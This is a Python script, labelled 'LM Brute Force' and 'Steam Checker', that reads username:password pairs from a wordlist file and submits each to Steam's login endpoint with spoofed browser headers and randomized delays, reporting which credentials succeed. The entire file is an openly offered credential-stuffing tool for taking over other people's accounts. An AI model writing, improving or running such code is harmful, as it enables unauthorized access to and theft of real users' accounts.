import requests
from requests.auth import HTTPProxyAuth
import random
import time
print("""

██╗░░░░░███╗░░░███╗  ██████╗░██████╗░██╗░░░██╗████████╗███████╗  ███████╗░█████╗░██████╗░░█████╗░███████╗
██║░░░░░████╗░████║  ██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░░░░██╔████╔██║  ██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░  █████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░
██║░░░░░██║╚██╔╝██║  ██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░  ██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░
███████╗██║░╚═╝░██║  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗  ██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗
╚══════╝╚═╝░░░░░╚═╝  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝  ╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝

                      Developers : MOOMLE !!
                      HTTPS://TEXT.LMLOL.XYZ 
                      Steam Checker by LM

        [+]███████████████████████████████████████████████████████████████████████████████████[+]

""")
for x in range (0,10):  
    b = "█" * x
    print (b, end="\r")
    time.sleep(0.1)


def login():
    count = 0
    while True:
        lines1 = [line for line in open ("wordlists.txt")]
        count += 1
        for item in lines1:
            username = lines1[count].split(':')[0] 
            password = lines1[count].split(':')[1]

        timeslleep = random.randint(5, 10)
        headers = {
            'Host': 'store.steampowered.com',
            'Origin': 'https://store.steampowered.com',
            'Referer': 'https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36',
            }
        
        data = {
            'donotcache': '1624348671672',#str(int(time.time() * 1000)),
            'username': username,
            'password': password,
            'twofactorcode': '',
            'emailauth': '',
            'loginfriendlyname': '',
            'captchagid': '-1',
            'captcha_text': '',
            'emailsteamid': '',
            'rsatimestamp': '',
            'remember_login': 'false',
        }

        try:
            time.sleep(timeslleep)
            request = requests.post('https://store.steampowered.com/login/dologin/', headers=headers ,data=data ,timeout=20).text
            print()
            print("[+] Request : " + request)
            print("[+] chack : " + username+" : "+password)

            if ('"success":true')in request:
                print("""
                
█▄█ █▀▀ █▀   █░█ █▀▀   █ █▀   █▀▀ █ █▄░█ █▀▄   ▀█▀ █░█ █▀▀   █▀█ ▄▀█ █▀ █▀ █░█░█ █▀█ █▀█ █▀▄
░█░ ██▄ ▄█   █▀█ ██▄   █ ▄█   █▀░ █ █░▀█ █▄▀   ░█░ █▀█ ██▄   █▀▀ █▀█ ▄█ ▄█ ▀▄▀▄▀ █▄█ █▀▄ █▄▀
                """)
                print("[+] find : " +username+" : "+password)
                break
            
            if ('"success":false') in request:
                print("[+] faild password : " + username+" : "+password)

        except:
            print("[+] Error 400 : ")
            continue
login()    
